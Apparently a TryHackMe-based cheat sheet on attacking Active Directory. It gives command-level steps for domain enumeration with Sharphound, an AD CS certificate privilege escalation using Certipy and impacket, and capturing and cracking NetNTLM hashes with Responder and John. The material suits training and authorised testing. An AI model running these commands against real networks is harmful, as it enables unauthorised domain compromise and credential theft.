---
title: Active Directory Pentesting
description: Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks.
tags:
    - Active Directory
    - Privilege Escalation
refs:
    - https://tryhackme.com/room/adenumeration
date: 2023-01-13
draft: false
---

## Enumeration

**[Seatbelt](https://github.com/GhostPack/Seatbelt)** is an enumeration tool.

### From Outside

Enumeration from outside.

```sh
# Domain Controllers
dig @<target-ip> <domain-name> any
```

### From Inside

Enumeration in the target machine after logged in.

```sh
# List all users in the AD domain
net user /domain
# Specific user
net user <username> /domain
PS> Get-ADUser -Identity <username> -Server dc.example.com -Properties *
# Filters
PS> Get-ADUser -Filter 'Name -like "*michael"' -Server dc.example.com | Format-Table Name,SamAccountName -A

# List all groups of the AD domain
net group /domain
# Specific group
net group "<group>" /domain
PS> Get-ADGroup -Identity <group> -Server dc.example.com -Properties *
# List the group members
PS> Get-ADGroupMember -Identity <group> -Server dc.example.com

# List the password policy of the AD domain
net accounts /domain

# List AD objects
PS> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
PS> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server dc.example.com

# Retrieve information about the given domain.
PS> Get-ADDomain -Server dc.example.com

# Change the password of the AD user
PS> Set-ADAccountPassword -Identity <username> -Server dc.example.com  -OldPassword (ConvertTo-SecureString -AsPlaintext "oldpass" -force) -NewPassword (ConvertTo-SecureString -AsPlaintext "newpass" -force)

# SYSVOL - A shared folder storing the Group Policy Objects (GPOs).
dir \\dc.example.com\SYSVOL\
```

### Bloodhound & Sharphound

1. **Enumerate the AD using Sharphound**

    In target machine, run Sharphound.

    ```powershell
    # Enumerate the AD information that can be visualized in Bloodhound
    Sharphound.exe --CollectionMethods All --Domain dc.example.com --ExcludeDCs 
    ```

    Then the zip file will be generated. This file can be displayed in Bloodhound.  
    To transfer the zip file to local machine, run the following command in local machine.

    ```sh
    scp <ad_username>@example.com:C:/Path/To/<sharphound_result>.zip .
    ```

2. **Start Bloodhound**
    
    In local machine, start neo4j console.
    
    ```sh
    sudo neo4j console
    ```
    
    After that, in another terminal, start Bloodhound. 
    
    ```sh
    bloodhound --no-sandbox
    ```
    
    This shows the authentication GUI. The default credential is:
    
    ```txt
    neo4j:neo4j
    ```
    
    However, we may need to change the neo4j password via http://localhost:7474/.
    
3. **Visualize the ZIP File**
    
    In Bloodhound, drag and drop the zip file which we transferd in the previous section.
    
    The json files will be imported.
    
4. **Attack Paths**
    
    After importing, we can view the several attack paths. Click the three stripe icon on the top-left of the window.


### Microsoft Management Console (mmc)

To setup the AD, follow this instructions:

1. Right-click on the Windows icon.
2. Click “Run” and enter “mmc” then click “OK”.
3. In the MMC, click “File → Add or Remove Snap-ins”.
4. Add all three “Active Directory…” snap-ins.
5. Right-click on the “Active Directory…” in the left pane and select “Change Forest”.
6. Enter the domain  as the Root domain and click OK.
7. Click on “View → Advanced Features”.

<br />

## SSH Login with AD Credentials

```sh
ssh dc.example.com\\<ad_username>@sub.dc.example.com
```

<br />

## Inject Credentials into Memory

```powershell
# /netonly: All network communications will use these injected credentials for authentication.
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

<br />

## DNS Configuration

```powershell
# PowerShell
$dnsip = "<DC_IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

Now check if the configuration is set correctly.

```powershell
nslookup dc.example.com
```

<br />

## Basic Knowledge

### User Management

- **Delegation**

    In Active Directory, the administrator delegate another user to manage users over an Organizational Unit (OU),  without the admin privileges.

    1. Setup

        1. Open "Active Directory Users and Computers".
        2. Right-click on the target OU, and click “Deligate Control…”. Then the new window will open.
        3. In the window, input username who you want to delegate the privilege that manage users.
        4. Select tasks to which the delegated user should manage.
        5. Click OK.

    2. Manage Users

        1. Logon as the delegated user.
        2. For instance, if you want to reset the john's password, execute the following command in PowerShell. Then input new password in prompt.

            ```powershell
            Set-ADAccountPassword john -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
            ```
        
        3. The first time John logs on after that, we want John to change his arbitrary password not the password you entered. So that to, execute the following command.

            ```powershell
            Set-ADUser -ChangePasswordAtLogon $true -Identity john -Verbose
            ```

        4. Now when John logs on he will be prompt to change a new password.

<br />

## AD CS (Active Directory Certificate Services)

1. **Request Certification & Authentication**

    **[Certipy](https://github.com/ly4k/Certipy)** is a tool for enumerating and abusing of AD CS.

    ```sh
    # User Template
    certipy req 'vuln.local/username:password@vuln.com' -ca VULN-CA  -template User
    # Machine Template
    certipy req 'vuln.local/machine-name:machine-password@vuln.com' -ca VULN-CA -template Machine

    # After requesting it, use the output credential when authenticating
    certipy auth -pfx user.pfx
    certipy auth -pfx machine.pfx
    ```

2. **Add Your Computer to the Domain**

    Using **addcomputer ([impacket](https://github.com/SecureAuthCorp/impacket))**  
    It is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.

    ```sh
    python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
    # or
    python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password@<hostname>' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
    ```

<br />

## Active Directory Certificate Services (AD CS) Privilege Escalation

AD CS is vulnerable to privilege escalation.

1. **Configure DNS**

    Modify DNS hostname on attack machine.

    ```sh
    10.0.0.1 vuln.com vulndc VULN-VULNDC-CA vuln.local
    ```

2. **Generate Certificate Test**

    ```sh
    # Request cerification
    certipy req 'vuln.local/username:password@vuln.com' -ca VULNDC-CA -template User

    # Authentication
    certipy auth -pfx administrator.pfx
    ```

3. **Add a Machine to the Domain**

    ```sh
    python3 ./impacket/examples.addcomputer.py 'vuln.local/username:password' -method LDAPS -computer-name 'MYPC' -computer-pass 'MyPcPassword'

    # Request certification for the computer
    # Use your own username and password (ex. 'MYPC$:MyPcPassword')
    certipy req 'vuln.local/MYPC$:MyPcPassword@vuln.com' -ca VULNDC-CA -template Machine

    # Authentication
    certipy auth -pfx mypc.pfx
    ```

4. **Update the DNS Hostname and SPN Attributes**

    ```sh
    # Connect using SSH
    ssh vuln.local\\username@vulndc

    # ---------------------------------------------

    # On target Windows machine

    # Start PowerShell
    powershell

    # Get the machine which participates the Active Directory
    Get-ADComputer MYPC -properties dnshostname,serviceprincipalname

    # Remove the current SPN attribute
    Set-ADComputer MYPC -ServicePrincipalName @{}

    # Then, set the DNS hostname to that of the DC
    Set-ADComputer MYPC -DnsHostName VULNDC.vuln.local
    ```

5. **Malicious Certificate (Get Another Machine Certificate)**

    ```sh
    # Request a new certificate for the computer again.
    certipy req 'vuln.local/MYPC$:MyPcPassword@vuln.com' -ca VULNDC-CA -template Machine

    # Then, we got a certificate for the another machine. 
    certipy auth -pfx ca.pfx
    ```

<br />

## Intercept NetNTLM Authentication

Start Responder to listen for any LLMNR, NBT-NS, WPAD requests.

```sh
sudo responder -I <interface-like-eth0>
```

Leave Responder running until receiving some requests.  
If you get NTLM hash, crack it in local machine.

```sh
echo -n '<copied-NTLM-hash>' > hash.txt
john --format=netntlmv2 --wordlist=wordlist.txt hash.txt
```

